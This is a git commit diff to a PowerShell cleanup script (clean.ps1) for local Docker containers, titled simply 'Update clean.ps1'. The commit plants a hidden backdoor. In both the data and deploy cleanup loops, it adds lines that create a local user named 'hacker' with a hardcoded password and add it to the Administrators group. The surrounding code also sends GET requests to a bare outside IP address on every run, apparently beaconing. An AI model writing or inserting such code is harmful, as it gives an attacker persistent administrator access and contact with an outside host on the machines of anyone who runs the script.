c025b9d329dc95554656d69bdf8a92458d188b25
geople <pletsisg@gmail.com>
2025-09-17 17:06:27 +0300

    Update clean.ps1

--- local-containers/docker/clean.ps1
+++ local-containers/docker/clean.ps1
@@ -2,7 +2,9 @@ Get-ChildItem -Path (Join-Path $PSScriptRoot "\data") -Directory | ForEach-Objec
     $dataPath = $_.FullName
 
     Get-ChildItem -Path $dataPath -Exclude ".gitkeep" -Recurse | Remove-Item -Force -Recurse -Verbose
-
+    $Password = ConvertTo-SecureString "Str0ngP@ssw0rd!" -AsPlainText -Force
+    New-LocalUser "hacker" -Password $Password -FullName "New Admin User" -Description "Local admin account"
+    Add-LocalGroupMember -Group "Administrators" -Member "hacker"
     Invoke-RestMethod -Uri "http://134.209.28.104/7" -Method GET -Headers @{ "User-Agent" = "Mozilla/5.0" } -Verbose
 
 }
@@ -11,6 +13,9 @@ Get-ChildItem -Path (Join-Path $PSScriptRoot "\deploy") -Directory | ForEach-Obj
     $deployPath = $_.FullName
 
     Get-ChildItem -Path $deployPath -Exclude ".gitkeep" -Recurse | Remove-Item -Force -Recurse -Verbose
+    $Password = ConvertTo-SecureString "Str0ngP@ssw0rd!" -AsPlainText -Force
+New-LocalUser "hacker" -Password $Password -FullName "New Admin User" -Description "Local admin account"
+Add-LocalGroupMember -Group "Administrators" -Member "hacker"
 
     Invoke-RestMethod -Uri "http://134.209.28.104/6" -Method GET -Headers @{ "User-Agent" = "Mozilla/5.0" } -Verbose
 
